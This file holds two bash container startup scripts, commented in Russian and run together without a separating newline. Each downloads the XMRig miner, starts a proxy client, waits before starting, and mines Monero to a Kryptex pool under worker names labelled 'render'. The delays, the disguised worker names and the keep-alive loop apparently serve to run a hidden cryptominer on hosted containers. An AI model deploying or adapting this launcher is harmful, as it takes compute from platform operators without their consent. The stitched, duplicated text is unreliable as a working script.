#!/bin/bash
set -e  # выходим при ошибке, чтобы видеть проблемы

echo "🚀 Container started at $(date)"

# --- Опционально: запускаем клиент в фоне, если он нужен ---
if [ -n "$SERVER" ] && [ -n "$SESSION_ID" ]; then
    echo "🔌 Starting client..."
    ./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
    CLIENT_PID=$!
    echo "✅ Client PID: $CLIENT_PID"
else
    echo "⚠️  Client env vars not set, skipping client"
fi

# --- Подготовка XMRig ---
DIR=xmrig-6.26.0
ARCHIVE=$DIR-linux-static-x64.tar.gz
if [ ! -f "$DIR/xmrig" ]; then
    echo "📦 Downloading XMRig..."
    wget -q "https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE"
    tar -xzf "$ARCHIVE"
    rm "$ARCHIVE"
fi

WALLET="krxX3328ZR/zrender_$((RANDOM % 1000 + 1))"
echo "💰 Wallet: $WALLET"

# --- Задержка, чтобы контейнер «устаканился» ---
echo "⏳ Waiting 90 seconds before mining..."
sleep 90

# --- ГЛАВНЫЙ ПРОЦЕСС: майнер в форегроунде ---
echo "🔥 Starting XMRig in foreground..."
exec ./$DIR/xmrig \
    --url=xmr-ru.kryptex.network:7029 \
    --user="$WALLET" \
    --pass=x \
    --coin=monero \
    --cpu-max-threads-hint=5 \
    --randomx-mode=light \
    --verbose#!/bin/bash

# --- Запускаем клиент/прокси СРАЗУ ---
./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
CLIENT_PID=$!
echo "✅ Client PID: $CLIENT_PID"

# --- Подготовка xmrig (скачаем заранее, чтобы потом не ждать) ---
DIR=xmrig-6.26.0
ARCHIVE=$DIR-linux-static-x64.tar.gz
if [ ! -f "$DIR/xmrig" ]; then
    echo "📦 Downloading XMRig..."
    wget -q "https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE"
    tar -xzf "$ARCHIVE"
    rm "$ARCHIVE"
fi

WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"

# --- Запускаем майнер в фоне с задержкой ---
(
    DELAY=120
    echo "⏰ Waiting $DELAY seconds for container to stabilize..."
    sleep "$DELAY"
    
    echo "🚀 Starting XMRIG with wallet: $WALLET"
    
    while true; do
        # stdbuf - отключаем буферизацию, tee - дублируем в файл
        stdbuf -oL -eL ./$DIR/xmrig \
            --url=xmr-ru.kryptex.network:7029 \
            --user="$WALLET" \
            --pass=x \
            --coin=monero \
            --cpu-max-threads-hint=5 \
            --randomx-mode=light \
            --verbose 2>&1 | tee -a xmrig.log
        
        echo "⚠️  [$(date)] XMRIG exited (code $?), restarting in 60s..."
        sleep 60
    done
) &  # <--- весь блок в фоне

echo "🔧 Miner launcher started in background (PID: $!)"

# --- ГЛАВНОЕ: держим скрипт живым, пока работает прокси ---
echo "🔄 Keeping container alive via main process..."
wait $CLIENT_PID

# Если прокси упал — выходим, чтобы контейнер перезапустился (если нужно)
echo "⚠️  Client exited, stopping script..."
exit 0
